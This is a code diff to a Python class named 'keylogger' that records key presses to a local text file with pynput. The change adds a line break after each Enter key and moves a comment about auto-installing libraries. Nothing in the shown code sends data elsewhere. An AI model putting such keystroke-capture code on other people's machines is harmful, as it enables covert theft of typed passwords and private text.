@@ -2,11 +2,11 @@
 ####################################################     LIBRARIES     ####################################################
 ###########################################################################################################################
 
-# If libraries are not installed by default, automatically download and install them
 import os
 from pynput import keyboard, mouse
 from ewmh import EWMH
 
+# If libraries are not installed by default, automatically download and install them
 # try:
 #     from pynput import keyboard, mouse
 #     from ewmh import EWMH
@@ -109,7 +109,8 @@ class keylogger():
             if key == keyboard.Key.space: pass
             else: 
                 with open(self.keylog_txt_name, 'a') as file: 
-                    file.write(f' "{str(key).split(".")[-1].lower()}" ')
+                    lower_key = str(key).split(".")[-1].lower()
+                    file.write(f' "{lower_key}"\n' if lower_key == "enter" else f' "{lower_key}" ')
                 # print(f' "{str(key).split(".")[-1].lower()}" ', end='', flush=True)
             self.previous_action = 'Key'
 
